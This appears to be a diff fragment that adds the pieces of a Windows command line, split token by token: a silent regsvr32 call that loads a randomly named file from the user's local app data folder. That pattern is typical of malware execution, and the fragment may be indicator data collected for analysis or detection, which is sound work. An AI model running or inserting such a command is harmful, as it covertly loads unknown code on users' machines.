@@ -1,0 +1,11 @@
+%
+WINDIR
+%
+\SysWOW64\regsvr32.exe
+/s
+''
+%
+LOCALAPPDATA
+%
+\Efcvdmhupkkqbtxa\gsbmnbfdntovf.cre
+''
